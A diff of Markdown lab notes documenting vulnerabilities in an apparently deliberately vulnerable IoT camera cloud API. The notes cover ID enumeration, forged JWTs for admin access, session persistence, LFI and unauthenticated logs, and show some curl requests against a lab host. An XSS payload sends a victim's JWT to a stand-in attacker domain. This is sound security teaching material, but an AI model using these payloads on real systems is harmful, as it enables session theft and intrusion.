@@ -44,7 +44,7 @@ findings:
 - The `/api/v1/userinfo?id=...` endpoint allows retrieval of sensitive information (username, role, etc.) for **any user** simply by knowing their identifier.
 - Resources such as _admin_access.js_ call `/api/v2/userinfo` to obtain data for the user attempting access, utilizing the identifier present in their token. This endpoint **does** validate who is requesting the user data, whereas the previous version does not, as it was originally intended for debugging purposes.
 - **No authorization control:** Any authenticated user (or even unauthenticated, if the endpoint does not require authentication) can query information about other users.
-- The frontend ([admin_access.js](app://obsidian.md/index.html)) uses this endpoint to validate the user's role. However, **the endpoint does not verify whether the requester has permission** to access the requested user's data. The frontend assumes that if this function returns a role of _"admin"_, it can then request the administration panel via POST to _/admin_, which will allow access to administrator functionalities. The issue arises because the frontend code reveals an internal server route, _/api/v2/userinfo_, which suggests the possibility of accessing a previous version that does not validate the requesting user.
+- The frontend (_admin_access.js_) uses this endpoint to validate the user's role. However, **the endpoint does not verify whether the requester has permission** to access the requested user's data. The frontend assumes that if this function returns a role of _"admin"_, it can then request the administration panel via POST to _/admin_, which will allow access to administrator functionalities. The issue arises because the frontend code reveals an internal server route, _/api/v2/userinfo_, which suggests the possibility of accessing a previous version that does not validate the requesting user.
 - An attacker can **enumerate IDs** and obtain a map of users, their roles, and installed cameras, facilitating privilege escalation attacks, internal phishing, or resource mapping.
 
 Any user can access /admin panel in order to validate its role. If the user is not an admin account, the panel will refuse the access attempt. Pressing "Validate Access" button will call for /admin/v2/userinfo in order to get user's information to check this. This endpoint is secured up so an user cannot use it to get other users information.
@@ -275,7 +275,7 @@ By analyzing the data traffic for the _/messages_ endpoint, it is observed that 
 
 ![[api2_sender_id_filtered.png]]
 
-This scenario is known as _Excessive Data Exposure_ and is categorized under [Broken Object Property Level Authorization](app://obsidian.md/index.html#api3-2023-broken-object-property-level-authorization). The _/api/messages_ endpoint exposes the sender's user ID, which is a sensitive property and should not be accessible to regular users.
+This scenario is known as _Excessive Data Exposure_ and is categorized under [[#API3:2023 - Broken Object Property Level Authorization|Broken Object Property Level Authorization]]. The _/api/messages_ endpoint exposes the sender's user ID, which is a sensitive property and should not be accessible to regular users.
 
 Next, an attempt is made to access _/admin_ using the administrator's identifier. A new JWT is crafted using the original token's structure, and a request is sent to _/admin_.
 
@@ -322,7 +322,7 @@ This attack targets session management and authentication tokens. When an unauth
 
 To simplify administrator login to the administration panel, the server creates an _admin_session_. This information is stored in the administrator's browser cookies and lacks protection against cookie theft. A professional implementation should use random session identifiers, associate the session with a secret, enforce expiration controls, and validate the session on every request. Additionally, HTTPS should be used, and protections against XSS and CSRF should be implemented.
 
-With this information, it can be inferred that access to the panel or its subdirectories might be possible using a short-lived token (_access token_). To obtain such a token, one must acquire it from an administrator account (see [[API - Vulnerabilities and features#API7 2023 - Server Site Request Forgery|SSRF Attack]]).
+With this information, it can be inferred that access to the panel or its subdirectories might be possible using a short-lived token (_access token_). To obtain such a token, one must acquire it from an administrator account (see [[#API7:2023 - Server Site Request Forgery|SSRF Attack]]).
 
 After obtaining the access token, it is observed that it has a relatively short expiration time. At the "change password" endpoint, users can update their password; however, the backend does not properly validate the input and generically updates profile data. Consequently, if the administrator's access token is provided and a field with the same key name as the _admin_ cookie is submitted, the request is validated. As a result, a valid session token with a long expiration period is registered to the user's account in the database, granting indefinite access to the administration panel.
 
@@ -340,7 +340,7 @@ By examining the JavaScript code (_admin_access.js_), it becomes apparent how th
 2. The system checks if the user is an administrator. If not, the frontend displays an error message indicating insufficient privileges. If the user is an administrator, a POST request is sent to the _/admin_ endpoint, granting access to various administrative functionalities.
 3. Once the _admin.html_ template data is retrieved, the frontend updates to display the administration panel.
 
-Given this behavior, the user may suspect two things: first, they might attempt to connect to the earlier version of the _/api/v1/userinfo_ endpoint, which may still be available and represent an additional attack surface (an outdated debugging function lacking proper controls; for more information, see [[API - Vulnerabilities and features#API1 2023 - Broken Object Level Authorization|Broken Object Level Authorization]]). Second, they may investigate the server's response when attempting to access the _/admin_ endpoint without sufficient privileges, a scenario not initially handled by the frontend.
+Given this behavior, the user may suspect two things: first, they might attempt to connect to the earlier version of the _/api/v1/userinfo_ endpoint, which may still be available and represent an additional attack surface (an outdated debugging function lacking proper controls; for more information, see [[#API1:2023 - Broken Object Level Authorization|Broken Object Level Authorization]]). Second, they may investigate the server's response when attempting to access the _/admin_ endpoint without sufficient privileges, a scenario not initially handled by the frontend.
 
 ```bash
 maxgarci@maxgarci-Ubuntu:~/Desktop/VulnZoo/cloud_api$ curl -v -X POST http://192.168.2.101:5000/admin \
@@ -426,7 +426,7 @@ If we attempt to manipulate the account deletion action, we observe that our use
 
 ![[api5_elliot.png]]
 
-> **NOTE:** You may wonder how an attacker can get other users' ID. Check [[#API3 2023 - Broken Object Property Level Authorization]], [[#1. Userinfo leak]], [[#Attack Vector 2 Information Disclosure via System Logs]] and [[#API8 2023 - Security Misconfiguration]].
+> **NOTE:** You may wonder how an attacker can get other users' ID. Check [[#API3:2023 - Broken Object Property Level Authorization]], [[#1. Userinfo leak]], [[#Attack Vector #2: Information Disclosure via System Logs]] and [[#API8:2023 - Security Misconfiguration]].
 
 ![[api5_user_delete_attempt.png]]
 
@@ -579,7 +579,7 @@ The endpoint `/api/system/logs` is designed as a system monitoring feature, but 
 - **Authentication:** Not required
 - **Optional Parameters:**
 - `type`: Filter by log level (info, debug, warn, error)
-    - [limit](vscode-file://vscode-app/usr/share/code/resources/app/out/vs/code/electron-browser/workbench/workbench.html): Maximum number of logs to return
+    - `limit`: Maximum number of logs to return
 
 # API9:2023 - Improper Inventory Management
 
@@ -593,7 +593,7 @@ The `/api/status` endpoint is intended to provide information about the system's
 
 The mechanism for validating the information available to the user performs insufficient sanitization of input parameters, which allows for the execution of a _Local File Inclusion (LFI)_ attack.
 
-Furthermore, this endpoint allows file uploads using the PUT method, creating an additional attack surface that can be exploited to compromise the associated IoT device. This is similar to the [[IoT - Vulnerabilities and features#IoT4 2018 - Lack of Secure Update Mechanism| lack of security in the update mechanism]] vulnerability.
+Furthermore, this endpoint allows file uploads using the PUT method, creating an additional attack surface that can be exploited to compromise the associated IoT device. This is similar to the [[IoT (Camera)/Vulnerabilities#IoT4:2018 - Lack of Secure Update Mechanism| lack of security in the update mechanism]] vulnerability.
 
 ### Vulnerable Endpoint
 
@@ -629,7 +629,7 @@ maxgarci@maxgarci-Ubuntu:~/Desktop/VulnZoo/cloud_api$ curl http://192.168.2.101:
 
 ## Attack Chain with Mobile Devices
 
-Read about the mobile vulnerability [[Mobile - Vulnerabilities and features#]]in this section.
+Read about the mobile vulnerability [[Mobile/Vulnerabilities|Mobile vulnerabilities]] in this section.
 
 As demonstrated, an attacker can leverage a **Local File Inclusion (LFI)** vulnerability in the `/api/status` endpoint to achieve arbitrary file reading on the API server. This provides access to sensitive information that may lead to:
 
@@ -721,7 +721,7 @@ Chained with the API10 sender spoofing, the attacker sends a message that appear
 <img src=x onerror="fetch('https://attacker.tld/x?j='+localStorage.getItem('jwt'))">
 ```
 
-When the victim opens the message the handler fires and exfiltrates the victim's JWT, which is also stored in plaintext by the mobile app (see [[Mobile - Vulnerabilities and features#M9 Insecure Data Storage|M9 - Insecure Data Storage]]). An inline fake login form is an equally effective phishing variant, reinforcing the spoofing scenario documented above.
+When the victim opens the message the handler fires and exfiltrates the victim's JWT, which is also stored in plaintext by the mobile app (see [[Mobile/Vulnerabilities#M9: Insecure Data Storage|M9 - Insecure Data Storage]]). An inline fake login form is an equally effective phishing variant, reinforcing the spoofing scenario documented above.
 
 **Impact:**
 - Theft of the victim's session JWT in their browser context.
